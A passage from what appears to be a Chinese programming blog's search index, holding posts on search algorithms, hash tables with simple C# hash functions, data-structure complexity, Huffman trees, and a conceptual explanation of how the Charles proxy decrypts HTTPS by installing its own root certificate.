说明：low=mid+1说明待查找的元素在[low,mid-1]范围内，k-=1 说明范围[low,mid-1]内的元素个数为F(k-1)-1个，所以可以递归 的应用斐波那契查找。 复杂度分析：最坏情况下，时间复杂度为$O(log_2n)$，且其期望复杂度也为$O(log_2n)$。 树表查找最简单的树表查找算法——二叉树搜索算法（Binary Search Tree）基本思想二叉搜索树是先对待查找的数据进行生成树，确保树的左分支的值小于右分支的值，然后在就行和每个节点的父节点比较大小，查找最适合的范围。 这个算法的查找效率很高，但是如果使用这种查找方法要首先创建树。 二叉搜索树（Binary Search Tree），也叫二叉查找树，或称二叉排序树，(Binary Sort Tree）。 二叉搜索树是具有下列性质的二叉树： 若任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 任意节点的左、右子树也分别为二叉搜索树。 二叉搜索树性质对二叉搜索树进行中序遍历，即可得到有序的数列。 复杂度分析它和二分查找一样，插入和查找的时间复杂度均为$O(log_2n)$，但是在最坏的情况下仍然会有O(n)的时间复杂度。原因在于插入和删除元素的时候，树没有保持平衡。我们追求的是在最坏的情况下仍然有较好的时间复杂度，这就是平衡搜索树设计的初衷。 基于二叉搜索树进行优化，进而可以得到其他的树表查找算法，如平衡树、红黑树等高效算法。 多路查找树（muitl-way search tree） - 2 - 3查找树（2-3 Tree）2 - 3查找树定义和二叉树不一样，2-3树运行每个节点保存一个或者两个的值。 对于2度节点（2-node），包含 1 个值，且只有 2 个子节点； 对于3度节点（3-node），包含 2 个值，且只有 3 个子节点。 2 - 3查找树的定义如下： 任一节点只能是 2 度节点（2-node）或 3 度节点（3-node），不存在值的数量为 0 的节点。 2 度节点（2-node）：包含 1 个值，且只有 2 个子节点的节点： 左子节点子树中所有节点的值都小于这个2 度节点的值； 右子节点子树中所有节点的值都大于等于这个2 度节点的值。 3 度节点（3-node）：包含 2 个值，且只有 3 个子节点的节点： 该节点的左值小于右值； 左子节点子树中所有节点的值都小于这个 3 度节点的左值； 中子节点子树中所有节点的值都大于等于这个 3 度节点的左值，且小于这个 3 度节点的右值； 右子节点子树中所有节点的值都大于这个 3 度节点的右值。 所有叶子节点都拥有相同的深度（depth），或者说，根节点到每一个为空节点的距离都相同。 元素始终保持排序顺序。 2-3查找树的性质 如果中序遍历2-3查找树，就可以得到排好序的序列； 在一个完全平衡的2-3查找树中，根节点到每一个为空节点的距离都相同（这也是平衡树中“平衡”一词的概念，根节点到叶节点的最长距离对应于查找算法的最坏情况，而平衡树中根节点到叶节点的距离都一样，意味着在最坏情况下，时间复杂度也为$log_2N$）。 性能分析2-3树的查找效率与树的高度是息息相关的。 在最坏的情况下，也就是所有的节点都是2-node节点，查找效率为$log_2N$； 在最好的情况下，所有的节点都是3-node节点，查找效率为$log_3N$约等于$0.631log_2N$； 距离来说，对于1百万个节点的2-3树，树的高度为12-20之间，对于10亿个节点的2-3树，树的高度为18-30之间。 对于插入来说，只需要常数次操作即可完成，因为他只需要修改与该节点关联的节点即可，不需要检查其他节点，所以效率和查找类似。下面是2-3查找树的效率： 多路查找树（muitl-way search tree） - 红黑树（Red-Black Tree）多路查找树（muitl-way search tree） - B树（B - Tree）树表查找总结二叉查找树平均查找性能不错，为 $log_2N$ ，但是最坏情况会退化为O(n)。在二叉查找树的基础上进行优化，我们可以使用平衡查找树。平衡查找树中的2-3查找树，这种数据结构在插入之后能够进行自平衡操作，从而保证了树的高度在一定的范围内进而能够保证最坏情况下的时间复杂度。但是2-3查找树实现起来比较困难，红黑树是2-3树的一种简单高效的实现，他巧妙地使用颜色标记来替代2-3树中比较难处理的3-node节点问题。红黑树是一种比较高效的平衡查找树，应用非常广泛，很多编程语言的内部实现都或多或少的采用了红黑树。 除此之外，2-3查找树的另一个扩展——B/B+平衡树，在文件系统和数据库系统中有着广泛的应用。 分块查找分块查找又称索引顺序查找，它是顺序查找的一种改进方法。 算法思想顺序查找和二分查找的结合。 将n个数据元素”按块有序”划分为m块（m ≤ n）。每一块中的结点不必有序，但块与块之间必须”按块有序”；即第1块中任一元素的关键字都必须小于第2块中任一元素的关键字；而第2块中任一元素又都必须小于第3块中的任一元素，…… 算法流程 先选取各块中的最大关键字构成一个索引表； 查找分两个部分：先对索引表进行二分查找或顺序查找，以确定待查记录在哪一块中；然后，在已确定的块中用顺序法进行查找。 效率时间复杂度：介于 O(n) 和 $log_2n$ 之间。 哈希查找什么是哈希表（Hash）？我们使用一个下标范围比较大的数组来存储元素。可以设计一个函数（哈希函数， 也叫做散列函数），使得每个元素的关键字都与一个函数值（即数组下标）相对应，于是用这个数组单元来存储这个元素；也可以简单的理解为，按照关键字为每一个元素”分类”，然后将这个元素存储在相应”类”所对应的地方。但是，不能够保证每个元素的关键字与函数值是一一对应的，因此极有可能出现对于不同的元素，却计算出了相同的函数值，这样就产生了”冲突”，换句话说，就是把不同的元素分在了相同的”类”之中。后面我们将看到一种解决”冲突”的简便做法。 总的来说，”直接定址”与”解决冲突”是哈希表的两大特点。 什么是哈希函数？哈希函数的规则是：通过某种转换关系，使关键字适度的分散到指定大小的的顺序结构中，越分散，则以后查找的时间复杂度越小，空间复杂度越高。 算法思想哈希的思路很简单，如果所有的键都是整数，那么就可以使用一个简单的无序数组来实现：将键作为索引，值即为其对应的值，这样就可以快速访问任意键的值。这是对于简单的键的情况，我们将其扩展到可以处理更加复杂的类型的键。 算法流程 用给定的哈希函数构造哈希表； 根据选择的冲突处理方法解决地址冲突。常见的解决冲突的方法：拉链法和线性探测法。 在哈希表的基础上执行哈希查找。 哈希表是一个在时间和空间上做出权衡的经典例子。如果没有内存限制，那么可以直接将键作为数组的索引。那么所有的查找时间复杂度为O(1)；如果没有时间限制，那么我们可以使用无序数组并进行顺序查找，这样只需要很少的内存。哈希表使用了适度的时间和空间来在这两个极端之间找到了平衡。只需要调整哈希函数算法即可在时间和空间上做出取舍。 复杂度分析单纯论查找复杂度：对于无冲突的Hash表而言，查找复杂度为O(1)（注意，在查找之前我们需要构建相应的Hash表）。 Hash是一种典型以空间换时间的算法，比如原来一个长度为100的数组，对其查找，只需要遍历且匹配相应记录即可，从空间复杂度上来看，假如数组存储的是byte类型数据，那么该数组占用100byte空间。现在我们采用Hash算法，我们前面说的Hash必须有一个规则，约束键与存储位置的关系，那么就需要一个固定长度的hash表，此时，仍然是100byte的数组，假设我们需要的100byte用来记录键与位置的关系，那么总的空间为200byte,而且用于记录规则的表大小会根据规则，大小可能是不定的。 Hash算法和其他查找算法的性能对比： Reference [Data Structure &amp; Algorithm] 七大查找算法 - https://www.cnblogs.com/maybe2030/p/4715035.htmlhe","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Network】Charles 为什么可以获取 HTTPS 包内容","date":"2019-05-31T08:04:12.000Z","path":"2019/05/31/【Network】Charles为什么可以获取HTTPS包内容/","text":"背景之前，我们在【Security】HTTPS 和 【Security】安全的 HTTP 的演化中介绍了HTTPS的工作原理，HTTPS的一个重要的作用，就是防止中间人攻击（Man-in-the-Middle Attack，MITM）。 然而，不知道你有没有考虑过，作为一个常用的macOS下抓包工具 - Charles，它是如何获取到HTTPS包中明文内容的。 比如，当我访问https://github.com 后，我能够在Charles里获取到首页对应的html的内容，如下所示： 分析我们知道，在我们能让Charles抓取HTTPS包之前，需要进行”Install Charles Certificate”操作，而关键就在这里。 来看看 Charles对这个Certificate的解释： Charles can be used as a man-in-the-middle HTTPS proxy, enabling you to view in plain text the communication between web browser and SSL web server. Charles does this by becoming a man-in-the-middle. Instead of your browser seeing the server’s certificate, Charles dynamically generates a certificate for the server and signs it with its own root certificate (the Charles CA Certificate). Charles receives the server’s certificate, while your browser receives Charles’s certificate. Therefore you will see a security warning, indicating that the root authority is not trusted. If you add the Charles CA Certificate to your trusted certificates you will no longer see any warnings 重点在于，当我们访问一个网站时（比如GitHub），Charles为会这个网站动态生成一张CA证书，这张由Charles动态生成的CA证书是能通过Charles Root Certificate验证的。 ##### 我们知道，操作系统都内置了多个根证书（如下所示）： 进行”Install Charles Certificate”操作，其实就是向操作系统添加一张根证书，根证书信息如下所示： 而所有的站点证书都基于证书链验证机制（如下图所示），即站点证书需要通过根证书的验证（否则，在浏览器中会提示当前访问网站不安全）。 验证分析在未打开Charles时，我们访问https://github.com，可以看到当前github的网站证书是由DigiCert（权威CA）签发的。自然地，也由DigiCert 的根证书来验证。 而在打开Charles之后，我们再次访问https://github.com，可以看到，这个github的网站证书其实是在我们访问时，由Charles动态生成的，更准确地说，是通过Charles导入操作系统的根证书签发的。 启发Charles其实就是一个支持HTTPS的中间人攻击（Man-in-the-Middle Attack，MITM）工具，而支持HTTPS的关键在于，我们需要向被攻击者的操作系统中添加我们的根证书。 同时，这也说明了HTTPS机制的安全性是基于客户端操作系统中根证书的正常性所保证的，换句话说，如果被攻击者在无意识的情况下，被攻击者向其其中添加了”攻击”根证书。 这种无意识的情况，可以通过很多种方式来实现，比如我们使用Adobe破解工具时，它请求了root权限，理论上，它也有可能向我们的操作系统中添加”攻击”根证书。 Reference SSL Proxying - https://www.charlesproxy.com/documentation/proxying/ssl-proxying/","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Data Structure】哈希表（Hash table）","date":"2019-05-30T14:25:32.000Z","path":"2019/05/30/【Data-Structure】哈希表/","text":"哈希表（Hash table）哈希表（Hash table，也叫散列表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做散列函数（Hash function），存放元素的数组称做散列表（Hash table）。 一个通俗的例子是，为了查找电话簿中某人的号码，可以创建一个按照人名首字母顺序排列的表（即建立人名 x 到首字母 F(x) 的一个函数关系），在首字母为W的表中查找“王”姓的电话号码，显然比查找包含所有人电话的电话簿就要快得多。这里使用人名作为关键字（或者说键，Key），“取首字母”是这个例子中散列函数的函数法则 F()，存放首字母的表对应散列表（Hash table）。关键字和函数法则理论上可以任意确定。 哈希表是一个在时间和空间上做出权衡的经典例子。如果没有内存限制，那么可以直接将键作为数组的索引。那么所有的查找时间复杂度为O(1)；如果没有时间限制，那么我们可以使用无序数组并进行顺序查找，这样只需要很少的内存。哈希表使用了适度的时间和空间来在这两个极端之间找到了平衡。只需要调整哈希函数算法即可在时间和空间上做出取舍。 散列函数/哈希函数（Hash Function）上面已经提到了，将一个元素的键（Key，或者说元素的特征）转换为存放元素的数组（即散列表）中对应下标的函数就是散列函数（Hash Function）。 散列函数能使对一个数据序列的访问过程更加迅速有效，通过散列函数，数据元素将被更快定位。 而在实际中，元素的键并不一定都是数字，有可能是字符串，还有可能是几个值的组合等，所以我们需要实现自己的散列函数。 整数直接定址法取关键字或关键字的某个线性函数值为散列地址。即 hash(k)=k或 hash(k)=ak+b，其中 a，b为常数（这种散列函数叫做自身函数）。 平方取中法取元素的键平方后的中间几位为哈希地址。 假如有以下关键字序列{421，423，436}，平方之后的结果为{177241，178929，190096}，那么可以取中间的两位数{72，89，00}作为Hash地址。 通常在选定哈希函数时不一定能知道关键字的全部情况，取其中的哪几位也不一定合适，而一个数平方后的中间几位数和数的每一位都相关，由此使随机分布的关键字得到的哈希地址也是随机的。取的位数由表长决定。 折叠法将元素的键拆分成几部分，然后将这几部分组合在一起，以特定的方式进行转化形成Hash地址。 假如知道图书的ISBN号为8903-241-23，可以将address(key)=89+03+24+12+3作为Hash地址。 除留取余法如果知道Hash表的最大长度为m，可以取不大于m的最大质数p，然后对关键字进行取余运算，address(key)=key%p。 在这里p的选取非常关键，p选择的好的话，能够最大程度地减少冲突，p一般取不大于m的最大质数。 字符串将字符串作为键的时候，我们也可以将他作为一个大的整数，采用保留除余法。我们可以将组成字符串的每一个字符取值然后进行哈希，比如 12345678910public int GetHashCode(string str)&#123; char[] s = str.ToCharArray(); int hash = 0; for (int i = 0; i &lt; s.Length; i++) &#123; hash = s[i] + (31 * hash); &#125; return hash;&#125; 上面的哈希值是Horner计算字符串哈希值的方法，公式为:$ h = s[0] · 31^{L–1} + … + s[L – 3] · 31^2 + s[L – 2] · 31^1 + s[L – 1] · 31^0$。 举个例子，比如要获取”call”的哈希值，字符串c对应的unicode为99，a对应的unicode为97，L对应的unicode为108，所以字符串”call”的哈希值为 $3045982 = 99·31^3 + 97·31^2 + 108·31^1 + 108·31^0 = 108 + 31· (108 + 31 · (97 + 31 · (99)))$ 如果对每个字符去哈希值可能会比较耗时，所以可以通过间隔取N个字符来获取哈西值来节省时间，比如，可以 获取每8-9个字符来获取哈希值： 1234567891011public int GetHashCode(string str)&#123; char[] s = str.ToCharArray(); int hash = 0; int skip = Math.Max(1, s.Length / 8); for (int i = 0; i &lt; s.Length; i+=skip) &#123; hash = s[i] + (31 * hash); &#125; return hash;&#125; 但是，对于某些情况，不同的字符串会产生相同的哈希值，这就是所谓的哈希冲突（Hash Collisions），比如下面的四个字符串： 如果我们按照每8个字符取哈希的话，就会得到一样的哈希值。 哈希冲突（Hash Collisions）哈希冲突（Hash Collisions），也叫做哈希碰撞，意思是两个或者多个 key 映射到了哈希表的同一个位置。 处理哈希冲突的方式有两种：避免和解决，即冲突避免机制（Collision Avoidance）和冲突解决机制（Collision Resolution）。 避免哈希冲突的一个方法就是选择合适的哈希函数。哈希函数中的冲突发生的几率与数据的分布有关。 例如，如果社保号的后 4 位是随即分布的，则使用后 4 位数字比较合适。但如果后 4 位是以员工的出生年份来分配的，则显然出生年份不是均匀分布的，则选择后 4 位会造成大量的冲突。 我们将这种选择合适的哈希函数的方法称为冲突避免机制（Collision Avoidance）。 要知道，无论我们如何选择哈希函数，哈希冲突也不可能完全被避免（只是尽量减少其发生的频率）。因此，在冲突发生后，有很多策略可以实施，这些策略称为冲突解决机制（Collision Resolution）。 Hash表大小的确定同时，Hash表大小的确定也非常关键，如果Hash表的空间远远大于最后实际存储的记录个数，则造成了很大的空间浪费，如果选取小了的话，则容易造成哈希冲突。 在实际情况中，一般需要根据最终记录存储个数和关键字的分布特点来确定Hash表的大小。还有一种情况时可能事先不知道最终需要存储的记录个数，则需要动态维护Hash表的容量，此时可能需要重新计算Hash地址。 哈希冲突解决机制（Hash Collision Resolution）为了知道冲突产生的相同散列函数地址所对应的关键字，必须选用另外的散列函数，或者对冲突结果进行处理。而不发生冲突的可能性是非常之小的，所以通常对冲突进行处理。 常用的解决哈希冲突（Hash Collisions）的方法有以下几种： 开放定址法（open addressing）开放定址法（open addressing） - 线性探查（Linear Probing）在开放寻址法中，最简单的一种实现就是线性探查（Linear Probing），步骤如下： 当插入新的元素时，使用哈希函数在哈希表中定位元素位置； 检查哈希表中该位置是否已经存在元素。如果该位置内容为空，则插入并返回，否则转向步骤 3。 如果该位置为 i，则检查 i+1 是否为空，如果已被占用，则检查 i+2，依此类推（沿着地址往下探测），直到找到一个内容为空的位置。 线性探查（Linear Probing）方式虽然简单，但并不是解决冲突的最好的策略，因为它会导致同类哈希的聚集（Primary Clustering）。这导致搜索哈希表时，冲突依然存在。 开放定址法（open addressing） - 二次探查（Quadratic Probing）一种改进的方式为二次探查（Quadratic Probing），即每次检查位置空间的步长为平方倍数。也就是说，如果位置 s 被占用，则首先检查 $s + 1^2$ 处，然后检查$s - 1^2$，$s + 2^2$，$s - 2^2$，$s + 3^2$ 依此类推，而不是象线性探查那样以 s + 1，s + 2 … 方式增长。尽管如此，二次探查同样也会导致同类哈希聚集问题（Secondary Clustering）。 开放定址法（open addressing） - 二度哈希（Rehashing）另一种改进的开放寻址法称为二度哈希（Rehashing），或称为双重哈希（Double Hashing）。 二度哈希的工作原理如下： 有一个包含一组哈希函数 H1…Hn 的集合。当需要从哈希表中添加或获取元素时，首先使用哈希函数 H1。如果导致冲突，则尝试使用 H2，以此类推，直到 Hn。所有的哈希函数都与 H1 十分相似，不同的是它们选用的乘法因子（multiplicative factor）。 单独链表法（Separate Chaining）链接技术（chaining）将采用额外的数据结构来处理冲突，其将哈希表中每个位置（slot）都映射到了一个链表。当冲突发生时，冲突的元素将被添加到桶（bucket）列表中，而每个桶都包含了一个链表以存储相同哈希的元素。 上图中的哈希表包含了 14 个桶（bucket）。如果一个新的元素要被添加至哈希表中，将会被添加至其 Key 的哈希所对应的桶中。如果在相同位置已经有一个元素存在了，则将会将新元素添加到列表的前面。 使用链接技术添加元素的操作涉及到哈希计算和链表操作，但其仍为常量，渐进时间为 O(1)。而进行查询和删除操作时，其平均时间取决于元素的数量和桶（bucket）的数量。具体的说就是运行时间为 O(n/m)，这里 n 为元素的总数量，m 是桶的数量。但通常对哈希表的实现几乎总是使 n = O(m)，也就是说，元素的总数绝不会超过桶的总数，所以 O(n/m) 也变成了常量 O(1)。 Rehash很多语言或者工具包哈希表的内部实现都使用了两个数组，其中一个作为备用。如果当前哈希表的负载因子（元素个数/哈希表容量大小）过大或者过小时，就需要将数据切换到备用数组里面，这个过程就是 rehash。 新的哈希表的大小可以有很多种方案，比如 redis 里面的哈希表（字典的底层实现）扩展时，新的哈希表的大小为大于当前哈希表里面存放元素的 2 倍的最小的 2 的 n 次幂。 Rehash 过程也很有讲究，这个过程不应该影响当前系统的运行，所以比较推崇的一种方法是渐进式 rehash。渐进式 rehash 的主要思想是在 rehash 阶段对于新的写请求，并不会写入老的哈希表里面，而是直接写入到新的哈希表里；对于读请求，优先读取新的哈希表，如果不存在，则去读老的的哈希表同时将这条数据迁移到新的哈希表里面来。 Rehash 有一个问题需要讨论一下：如何鉴定 rehash 阶段的开始与结束？开始很简单，每次写操作或者定期检测一下负载因子，当满足条件则开始 rehash。那么如何鉴定结束呢？一种比较常规的方法是定期检测，但是这涉及到很多问题，比如如何界定检测的时间粒度。另一种是记录下迁移过程。还是以 Redis 为例来说明，Redis 使用的是 1.2 介绍的哈希表元素作为链表头不存储元素的方式，这样数据迁移的时候只需要从原链表将节点删除，然后插入到新的哈希表对应的位置就好了。同时哈希表结构有一个字段记录了老的哈希表残留的数据，这样我们只需要检测这个变量（代价很小）就知道 rehash 有没有完成了。 rehash 过程如下图所示（来自 《Redis 设计与实现》）： 迁移索引 1 和 2 上的过程图略去。 Reference Wikipedia 散列表 - https://zh.wikipedia.org/wiki/%E5%93%88%E5%B8%8C%E8%A1%A8 十一、从头到尾解析Hash表算法 - https://blog.csdn.net/v_JULY_v/article/details/6256463 小朋友学数据结构：哈希表 - https://www.jianshu.com/p/de33dc676a3f 浅谈算法和数据结构: 十一 哈希表 - https://www.cnblogs.com/yangecnu/p/Introduce-Hashtable.html 聊一聊哈希表 - http://legendtkl.com/2017/07/23/about-hash-table/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】常用数据结构的时间复杂度","date":"2019-05-30T13:14:56.000Z","path":"2019/05/30/【Data-Structure】常用数据结构的时间复杂度/","text":"常用数据结构的时间复杂度 Data Structure Add Find Delete GetByIndex Array (T[]) O(n) O(n) O(n) O(1) Linked list (LinkedList) O(1) O(n) O(n) O(n) Resizable array list (List) O(1) O(n) O(n) O(1) Stack (Stack) O(1) - O(1) - Queue (Queue) O(1) - O(1) - Hash table (Dictionary) O(1) O(1) O(1) - Tree-based dictionary (SortedDictionary&lt;K,T&gt;) O(log n) O(log n) O(log n) - Hash table based set (HashSet) O(1) O(1) O(1) - Tree based set (SortedSet) O(log n) O(log n) O(log n) - 如何选择数据结构 Array (T[])：当元素的数量是固定的，并且需要使用下标时。 Linked list (LinkedList)：当元素需要能够在列表的两端添加时。否则使用 List。 Resizable array list (List)：当元素的数量不是固定的，并且需要使用下标时。 Stack (Stack)：当需要实现 LIFO（Last In First Out）时。 Queue (Queue)：当需要实现 FIFO（First In First Out）时。 Hash table (Dictionary&lt;K,T&gt;)：当需要使用键值对（Key-Value）来快速添加和查找，并且元素没有特定的顺序时。 Tree-based dictionary (SortedDictionary&lt;K,T&gt;)：当需要使用价值对（Key-Value）来快速添加和查找，并且元素根据 Key 来排序时。 Hash table based set (HashSet)：当需要保存一组唯一的值，并且元素没有特定顺序时。 Tree based set (SortedSet)：当需要保存一组唯一的值，并且元素需要排序时。 各种数据结构数组（Array）在计算机程序设计中，数组（Array）是最简单的而且应用最广泛的数据结构之一。在任何编程语言中，数组都有一些共性： 数组中的内容是使用连续的内存（Contiguous Memory）来存储的。 数组中的所有元素必须是相同的类型，或者类型的衍生类型。因此数组又被认为是同质数据结构（Homegeneous Data Structures）。 数组的元素可以直接被访问。比如你需要访问数组的第 i 个元素，则可以直接使用 arrayName[i] 来访问。 对于数组的常规操作包括： 分配空间（Allocation） 数据访问（Accessing） 链表（LinkedList）在链表（Linked List）中，每一个元素都指向下一个元素，以此来形成了一个链（chain）。 在创建一个链表时，我们仅需持有头节点 head 的引用，通过逐个遍历下一个节点 next 即可找到所有的节点。 查找元素对于查找元素，链表与数组有着同样的线性运行时间 O(n)。例如在上图中，如果我们要查找 Sam 节点，则必须从头节点 Scott 开始查找，逐个遍历下一个节点直到找到 Sam。 删除元素同样，从链表中删除一个节点的渐进时间也是线性的O(n)。因为在删除之前我们仍然需要从 head 开始遍历以找到需要被删除的节点。而删除操作本身则变得简单，即让被删除节点的左节点的 next 指针指向其右节点。下图展示了如何删除一个节点。 插入元素向链表中插入一个新的节点的渐进时间取决于链表是否是有序的。如果链表不需要保持顺序，则插入操作就是常量时间O(1)，可以在链表的头部或尾部添加新的节点。 而如果需要保持链表的顺序结构，则需要查找到新节点被插入的位置，这使得需要从链表的头部 head 开始逐个遍历，结果就是操作变成了O(n)。下图展示了插入节点的示例。 链表与数组链表与数组的不同之处在于，数组的中的内容在内存中时连续排列的，可以通过下标来访问，而链表中内容的顺序则是由各对象的指针所决定，这就决定了其内容的排列不一定是连续的，所以不能通过下标来访问。如果需要更快速的访问操作，使用数组可能是更好的选择。 使用链表的最主要的优势就是，向链表中插入或删除节点无需调整结构的容量。而相反，对于数组来说容量始终是固定的，如果需要存放更多的数据，则需要调整数组的容量，这就会发生新建数组、数据拷贝等一系列复杂且影响效率的操作。 链表的另一个优点就是特别适合以排序的顺序动态的添加新元素。如果要在数组的中间的某个位置添加新元素，不仅要移动所有其余的元素，甚至还有可能需要重新调整容量。 所以总结来说，数组适合数据的数量是有上限的情况，而链表适合元素数量不固定的情况。 队列（Queue）队列（Queue）是一个先进先出顺序（FIFO）的数据结构。 Queue 内部建立了一个存放 T 对象的环形数组，并通过 head 和 tail 变量来指向该数组的头和尾。 栈（Stack）栈（Stack）是一个后进先出顺序（LIFO）的数据结构，其提供 Push 和 Pop 方法来实现对 Stack元素的存取。 Stack中存储的元素可以通过一个垂直的集合来形象的表示。当新的元素压入栈中（Push）时，新元素被放到所有其他元素的顶端。当需要弹出栈（Pop）时，元素则被从顶端移除。 Push 操作的复杂度为 O(1)。如果容量需要被扩展（前提是栈通过数组来实现），则 Push 操作的复杂度变为 O(n)。Pop 操作的复杂度始终为 O(1)。 Hashtable现在假设我们要使用员工的社保号作为唯一标识进行存储。社保号的格式为 DDD-DD-DDDD（D 的范围为数字 0-9）。 如果使用 Array 存储员工信息，要查询社保号为 111-22-3333 的员工，则将会尝试遍历数组的所有位置，即查询操作的时间复杂度为 O(n) 。 如果我们仍然使用 Array 存储员工信息，但是将社保号基于其对应的数字大小进行排序，那么，查询一个指定的社保号操作的时间复杂度为 $O(log_2(n))$ 。 但，我们希望查询操作的时间复杂度为 O(1)。 方案1一种方案是建立一个大数组，范围从 000-00-0000 到 999-99-9999 。 这种方案的缺点是浪费空间。如果我们仅需要存储 1000 个员工的信息，那么仅利用了 0.0001% 的空间。 方案2第二种方案就是用哈希函数（Hash Function）压缩序列。 我们选择使用社保号的后四位作为索引，以减少区间的跨度。这样范围将从 0000 到 9999。 或者，我们也可以采用将 9 位数转换为 4 位数的方式，在数学上，这种方式称为哈希转换（Hashing）。可以将一个数组的索引空间（indexers space）压缩至相应的哈希表（Hash Table）。在上面的例子中，哈希函数的输入为 9 位数的社保号，输出结果为后 4 位。 上图中也说明在哈希函数计算中常见的一种行为：哈希冲突（Hash Collisions）。即有可能两个社保号的后 4 位均为 0000。 当要添加新元素到 Hashtable 中时，哈希冲突是导致操作被破坏的一个因素。如果没有冲突发生，则元素被成功插入。如果发生了冲突，则需要判断冲突的原因。因此，哈希冲突提高了操作的代价，Hashtable 的设计目标就是要尽可能减低冲突的发生。 处理哈希冲突的方式有两种：避免和解决，即冲突避免机制（Collision Avoidance）和冲突解决机制（Collision Resolution）。 避免哈希冲突的一个方法就是选择合适的哈希函数。哈希函数中的冲突发生的几率与数据的分布有关。例如，如果社保号的后 4 位是随即分布的，则使用后 4 位数字比较合适。但如果后 4 位是以员工的出生年份来分配的，则显然出生年份不是均匀分布的，则选择后 4 位会造成大量的冲突。我们将这种选择合适的哈希函数的方法称为冲突避免机制（Collision Avoidance）。 在处理冲突时，有很多策略可以实施，这些策略称为冲突解决机制（Collision Resolution）。其中一种方法就是将要插入的元素放到另外一个块空间中，因为相同的哈希位置已经被占用。 通常采用的冲突解决策略为开放寻址法（Open Addressing），所有的元素仍然都存放在哈希表内的数组中。 开放寻址法的最简单的一种实现就是线性探查（Linear Probing），步骤如下： 当插入新的元素时，使用哈希函数在哈希表中定位元素位置； 检查哈希表中该位置是否已经存在元素。如果该位置内容为空，则插入并返回，否则转向步骤 3。 如果该位置为 i，则检查 i+1 是否为空，如果已被占用，则检查 i+2，依此类推，直到找到一个内容为空的位置。 现在如果我们要将五个员工的信息插入到哈希表中： Alice (333-33-1234) Bob (444-44-1234) Cal (555-55-1237) Danny (000-00-1235) Edward (111-00-1235) 则插入后的哈希表可能如下： 元素的插入过程： Alice 的社保号被哈希为 1234，因此存放在位置 1234。 Bob 的社保号被哈希为 1234，但由于位置 1234 处已经存放 Alice 的信息，则检查下一个位置 1235，1235 为空，则 Bob 的信息就被放到 1235。 Cal 的社保号被哈希为 1237，1237 位置为空，所以 Cal 就放到 1237 处。 Danny 的社保号被哈希为 1235，1235 已被占用，则检查 1236 位置是否为空，1236 为空，所以 Danny 就被放到 1236。 Edward 的社保号被哈希为 1235，1235 已被占用，检查1236，也被占用，再检查1237，直到检查到 1238时，该位置为空，于是 Edward 被放到了1238 位置。 一种改进的方式为二次探查（Quadratic Probing），即每次检查位置空间的步长为平方倍数。也就是说，如果位置 s 被占用，则首先检查 s + 12 处，然后检查s - 12，s + 22，s - 22，s + 32 依此类推，而不是象线性探查那样以 s + 1，s + 2 … 方式增长。尽管如此，二次探查同样也会导致同类哈希聚集问题（Secondary Clustering）。 Reference 常用数据结构及复杂度 - https://www.cnblogs.com/gaochundong/p/data_structures_and_asymptotic_analysis.html 浅谈算法和数据结构: 十一 哈希表 - https://www.cnblogs.com/yangecnu/p/Introduce-Hashtable.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】哈夫曼树（Huffman Tree）","date":"2019-05-30T06:58:47.000Z","path":"2019/05/30/【Data-Structure】树-哈夫曼树/","text":"背景在了解赫夫曼树之前，我们首先先介绍一些基础概念。 路径路径是指在一棵树中，从一个节点到另一个节点之间的分支构成的通路。 如从节点8到节点1的路径如下图所示： 路径长度路径长度指的是路径上分支的数目，在上图中，路径长度为2。 结点的度结点的度指的是二叉树结点的分支数目， 如果某个结点没有孩子结点，即没有分支，那么它的度是0；如果有一个孩子结点， 那么它的度数是1；如果既有左孩子也有右孩子， 那么这个结点的度是2。 节点的权节点的权指的是为树中的每一个节点赋予的一个非负的值，如上图中每一个节点中的值就是对应节点的权。 节点的带权路径长度节点的带权路径长度指的是从根节点到该节点之间的路径长度与该节点权的乘积：如上图中，对于1节点的带权路径长度为：2。 树的带权路径长度树的带权路径长度指的是所有叶子节点的带权路径长度之和。 扩充二叉树对于一颗已有的二叉树， 如果我们为它添加一系列新结点， 使得它原有的所有结点的度都为2，那么我们就得到了一颗扩充二叉树， 如下图所示： 其中原有的结点叫做内结点（非叶子结点）， 新增的结点叫做外结点（叶子结点）。 我们可以得出： 外结点数 = 内结点数 + 1 并进一步得出： 总结点数 = 2 × 外结点数 -1 扩充二叉树，构成了赫夫曼树的基本形态，而上面的公式，也是我们构建赫夫曼树的依据之一。 赫夫曼树的外结点和内结点赫夫曼树的外结点和内结点的性质区别：外节点是携带了关键数据的结点， 而内部结点没有携带这种数据， 只作为导向最终的外结点所走的路径而使用。 正因如此，我们的关注点最后是落在赫夫曼树的外结点上， 而不是内结点。 带权路径长度（WPL）让我们思考一下： 在一颗在外结点上存储了数据的扩充二叉树中进行查找时，数据结点怎么分布才能尽可能减少查找的开销呢？ 这里我们再加上一个前提：不同的数据结点搜索的频率（或概率）是不一致的。 显然， 我们大致的思路是： 如果一个数据结点搜索频率越高，就让它分布在离根结点越近的地方，也即从根结点走到该结点经过的路径长度越短。 这样就能从整体上优化整颗树的性能。 频率是个细化的量，这里我们用一个更加标准的一个词描述它——“权值”。 综上， 我们为扩充二叉树的外结点（叶子结点）定义两条属性： 权值（w）和路径长度（l）。同时规定带权路径长度（WPL）为扩充二叉树的外结点的权值和路径长度乘积之和： 哈夫曼树（最优二叉树，Huffman Tree）由n个权值构造一颗有n个叶子结点的二叉树， 则其中带权路径长度WPL最小的二叉树， 就是哈夫曼树（Huffman 